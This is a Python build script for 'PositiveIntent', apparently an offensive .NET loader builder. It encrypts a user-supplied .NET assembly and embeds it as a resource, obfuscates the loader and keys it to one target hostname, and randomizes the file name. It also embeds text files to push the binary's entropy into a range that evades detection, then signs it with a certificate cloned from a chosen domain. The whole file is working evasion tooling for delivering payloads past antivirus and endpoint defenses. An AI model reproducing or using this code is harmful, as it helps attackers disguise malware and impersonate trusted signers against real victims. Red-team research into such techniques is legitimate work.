import sys
import argparse
import random
import traceback
import string
from modules import obfuscate
from modules import rc4
from modules import entropy
from modules import sign
import subprocess
import os
import xml.etree.ElementTree as ET
import colorama

def randomize_assembly_name(csproj_path, new_name):
    """Modifies the AssemblyName property in the .csproj file."""
    # Parse the .csproj XML file
    tree = ET.parse(csproj_path)
    root = tree.getroot()

    property_group = root.find('PropertyGroup')
    if property_group is not None:
        assembly_name_element = ET.SubElement(property_group, 'AssemblyName')

    # Update the AssemblyName to the new random name
    assembly_name_element.text = new_name
    
    # Write changes back to the .csproj file
    tree.write(csproj_path, encoding="utf-8", xml_declaration=True)
    print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Randomized loader filename")
    return new_name

def embed_book(resx_file_path, resource_name, text_file_path):
    # Parse the .resx file
    tree = ET.parse(resx_file_path)
    root = tree.getroot()

    # Create a new data element for the text file resource
    data = ET.Element("data")
    data.set("name", resource_name)
    data.set("xml:space", "preserve")

    # Add the value element (content of the text file)
    with open(text_file_path, 'r', encoding="utf-8") as f:
        value = ET.Element("value")
        value.text = f.read()

    data.append(value)
    
    # Append the new resource to the root element
    root.append(data)

    # Write the updated .resx file
    tree.write(resx_file_path, encoding="utf-8", xml_declaration=True)

def build():
    assembly_name = randomize_assembly_name(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\PositiveIntent.csproj"), ''.join(random.choices(string.ascii_letters, k=8)))
    assembly_output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp\\PositiveIntent\\bin\\release\\net48\\{assembly_name}") + ".exe"
    subprocess.run(["dotnet", "build", "--configuration", "Release", os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent.sln")], check=True, stdout = subprocess.DEVNULL)
    embed_count = 0
    if(entropy.run(assembly_output_path) >= 5.50):
        for root, dirs, files in os.walk(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\Resources"), topdown=True):
            for file_name in files:
                if file_name.endswith('.txt'):
                    file_path = os.path.join(root, file_name)
                    embed_book(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\Properties\\Resources.resx"), file_name, file_path)
                    embed_count += 1
                    subprocess.run(["dotnet", "build", "--configuration", "Release", os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent.sln")], check=True, stdout = subprocess.DEVNULL)
                    if(4.50 <= entropy.run(assembly_output_path) <= 5.50):
                        if(embed_count > 0):
                            print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Embedded {embed_count} books as resource files')
                        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Entropy of loader: {entropy.run(assembly_output_path)}')
                        break
            else:
                continue
            break
    return assembly_name

if __name__=="__main__":

    # platform check
    #if sys.platform != "linux" or sys.platform != "linux2":
    #    print("\nThis tool could definitely support Windows, but it doesn't right now. Linux only. Sorry.\n")
    #    sys.exit(-1)

    # parse arguments
    parser = argparse.ArgumentParser(description='PositiveIntent .NET Loader')
    parser.add_argument('--file', type=argparse.FileType('rb'),
                        required=True, help='Path to your .NET assembly (e.g. Seeker.exe)')
    parser.add_argument('--hostname', type=str, required=True,
                        help='Restrict execution of loader to hostname')
    parser.add_argument('--domain', type=str, required=True,
                        help='Domain to copy certificate from. Used to generate a self-signed certificate and digitally sign the loader.')
    args = parser.parse_args()

    # obfuscate loader source
    # key on hostname
    try:
        obfuscate.run(args.hostname)
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Obfuscated loader source files')
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Keyed on hostname {args.hostname}')
    except Exception as exception: # is this error handling?
        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to obfuscate source files')
        print(exception)

    # encrypt .NET assembly and embed as a resource file
    try:
        rc4.run(args.file)
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Encrypted and embedded {args.file.name} as a resource file")
    except Exception as exception: # we're really doing this
        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to encrypt and embed .NET assembly')
        print(traceback.print_exc())

    # build loader and adjust entropy
    assembly_name = build()

    # digitally sign loader executable
    try:
        sign.run(args.domain, assembly_name)
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Digitally signed loader with certificate cloned from {args.domain}')
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + 'Loader compiled to ' + os.path.join(os.path.dirname(os.path.abspath(__file__)), f"..\\temp\\{assembly_name}.exe"))
    except Exception as exception:
        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to digitally sign loader')
        print(exception)
